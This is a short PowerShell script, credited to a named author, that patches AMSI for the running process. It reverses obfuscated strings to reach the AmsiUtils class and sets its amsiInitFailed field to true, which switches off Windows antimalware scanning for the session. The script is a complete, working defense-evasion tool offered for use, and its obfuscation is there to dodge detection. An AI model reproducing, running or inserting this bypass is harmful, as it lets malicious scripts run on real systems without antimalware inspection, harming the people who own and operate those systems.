########################################################
#
# A script that patches AMSI for the running process 
# Author: yanal abuseini
# [LINK]
#
########################################################

function EvadeAmsi{
	$string1 = 'slitUismA'
	$string2 = 'deliaFtinIisma'
	$rev1 = ([regex]::Matches($String1,'.','RightToLeft') | ForEach {$_.value}) -join ''
	$rev2 = ([regex]::Matches($String2,'.','RightToLeft') | ForEach {$_.value}) -join ''
	[Ref].Assembly.GetType('System.Management.Automation.' +$rev1).GetField($rev2,'NonPublic,Static').SetValue($null,$true)
}